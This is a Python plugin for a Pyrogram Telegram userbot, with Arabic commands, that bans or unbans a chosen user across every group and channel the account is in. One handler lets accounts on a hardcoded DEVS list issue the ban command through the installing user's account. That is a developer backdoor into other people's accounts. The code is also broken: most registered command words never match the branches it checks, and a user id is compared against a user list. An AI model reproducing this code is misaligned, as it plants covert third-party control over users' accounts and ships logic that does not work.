
from pyrogram import Client, errors, filters
from pyrogram.types import ChatPermissions, Message
from pyrogram import Client 
from pyrogram.enums import ChatType
import asyncio
from . import *
from ubotlibs.ubot.helper import edit_or_reply
from ubotlibs.ubot.utils.misc import *
from ubotlibs.ubot.helper.PyroHelpers import get_ub_chats




@Client.on_message(
    filters.command(["دزز", "حظر عام"], "") & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["انقلع", "حظر عام"], "") & filters.me)
async def _(client, message):
    user_id = await extract_user(message)
    nay = await message.reply("<b>جاري. . .</b>")
    if not user_id:
        return await nay.edit("<b> المستخدم غير موجود</b>")
    if user_id == client.me.id:
        return await nay.edit("لا يمكنك حظر نفسك.")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await nay.edit(error)
    done = 0
    failed = 0
    text = [
        "<b>💬 الحظر العام</b>\n\n<b>✅ نجح: {} مجموعة</b>\n<b>❌ فشل: {} مجموعة</b>\n<b>👤 المستخدم: <a href='tg://user?id={}'>{} {}</a></b>",
        "<b>💬 الحظر العام</b>\n\n<b>✅ نجح: {} مجموعة</b>\n<b>❌ فشل: {} مجموعة</b>\n<b>👤 المستخدم: <a href='tg://user?id={}'>{} {}</a></b>",
    ]
    if message.command[0] == "حظرر":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                if user.id == DEVS:
                    return await nay.edit(
                        "لا يمكنك استخدام الامر على مطوري"
                    )
                elif not user.id == DEVS:
                    try:
                        await client.ban_chat_member(chat_id, user.id)
                        done += 1
                        await asyncio.sleep(0.1)
                    except:
                        failed += 1
                        await asyncio.sleep(0.1)
        await nay.delete()
        return await message.reply(
            text[0].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )
    elif message.command[0] == "الغاء عام":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                try:
                    await client.unban_chat_member(chat_id, user.id)
                    done += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
                    await asyncio.sleep(0.1)
        await nay.delete()
        return await message.reply(
            text[1].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )
    elif message.command[0] == "حظر عام":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                if user.id == DEVS:
                    return await nay.edit(
                        "لا يمكنك استخدام الامر على مطوري"
                    )
                elif not user.id == DEVS:
                    try:
                        await client.ban_chat_member(chat_id, user.id)
                        done += 1
                        await asyncio.sleep(0.1)
                    except:
                        failed += 1
                        await asyncio.sleep(0.1)
        await nay.delete()
        return await message.reply(
            text[0].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )
    elif message.command[0] == "cungban":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                try:
                    await client.unban_chat_member(chat_id, user.id)
                    done += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
                    await asyncio.sleep(0.1)
        await nay.delete()
        return await message.reply(
            text[1].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )


add_command_help(
    "الحظر",
    [
        [
            "حظرر <ربالرد/الايدي/المعف>",
            "حظر من كل القنوات والمجموعات التي انت مشرف فيها.",
        ],
        ["الغاء عام <بالرد/الايدي/المعرف>", "يقوم بالغاء الحظر العام."],
    ],
)
